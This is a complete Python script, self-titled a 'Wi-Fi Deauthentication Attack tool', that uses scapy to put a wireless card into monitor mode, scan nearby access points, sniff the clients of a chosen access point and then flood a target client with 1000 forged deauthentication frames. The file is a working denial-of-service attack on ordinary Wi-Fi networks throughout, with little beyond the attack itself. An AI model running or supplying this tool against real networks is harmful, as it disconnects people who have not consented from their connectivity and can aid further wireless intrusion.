from past.builtins import raw_input
from scapy.all import *
from threading import Thread
import pandas
import time
import os
import sys
import re
# initialize the networks dataframe that will contain all access points nearby
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth

networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
b_mac = 'ff:ff:ff:ff:ff:ff'
found_clients = {}
clients = 1  # Index for each client
snif_time = 60


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)

def is_mac_valid(mac_adr):
    valid = re.match('(?=[a-f0-9]{2}:){5}[a-f0-9]{2}', mac_adr, re.I)
    if valid:
        return True
    else:
        return False

def find_client():
    global target_a, target, channel
    target = input('Please enter AP MAC address: \n')
    while (not is_mac_valid(target)):
        target = input('Wrong MAC address please try again: \n')
        is_mac_valid(target)
    print("Scanning for clients connected to this MAC...      Takes up to 1 minute\n")

    sniff(prn=lookup_clients, iface=interface, timeout=snif_time)
    print("Scan finished.")


def lookup_clients(packet):
    temp = target
    lookup_clients_ap(temp, packet)
                

def lookup_clients_ap(ap_mac, packet):
    global clients

    # Check if this is a client's packet and the destination is the target AP
    if packet.addr1 == ap_mac:
        if packet.addr2 not in found_clients.values():
            address = packet.addr2
            print(address)
            found_clients[clients] = packet.addr2
            clients += 1

def deauth():
    ssid_mac = raw_input('Please enter the SSID mac for Deauthentication Attack: \n')
    while (not is_mac_valid(ssid_mac)):
        ssid_mac = raw_input('Wrong MAC address please try again: \n')
        is_mac_valid(ssid_mac)
    print('making attack for mac -> %s \n' % ssid_mac)
    dot11 = Dot11(addr1=ssid_mac, addr2=target, addr3=target)
    packet = RadioTap() / dot11 / Dot11Deauth()
    sendp(packet, inter=0.001, count=1000, iface=interface)


def print_all():
    global count
    for countp in range(int(snif_time)):
        os.system("clear")
        print(networks)
        time.sleep(0.5)



def change_channel():
    global ch, count
    ch = 1
    for count in range(int(snif_time)):
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)



def thread_start():
    # start the thread that prints all the networks
    printer = Thread(target=print_all)
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()


if __name__ == "__main__":
    # interface name, check using iwconfig
    interface = sys.argv[1]
    print('\033[1;31m                          Wi-Fi Deauthentication Attack tool\033[1;m')
    print("Trying to set monitor mode for device " + interface + "...")
    os.system("ifconfig " + interface + " down")
    print(interface + " down")
    os.system("iwconfig " + interface + " mode monitor")
    print(interface + " mode monitor")
    os.system("ifconfig " + interface + " up")
    print(interface + " up")
    print("Done. If you don't see any data, the monitor mode setup may have failed.")
    time.sleep(2)
    print('                             looking for AP Please wait ')
    thread_start()
    # start sniffing
    sniff(prn=callback, iface=interface, timeout=snif_time)
    find_client()
    # Deauthentication
    deauth()





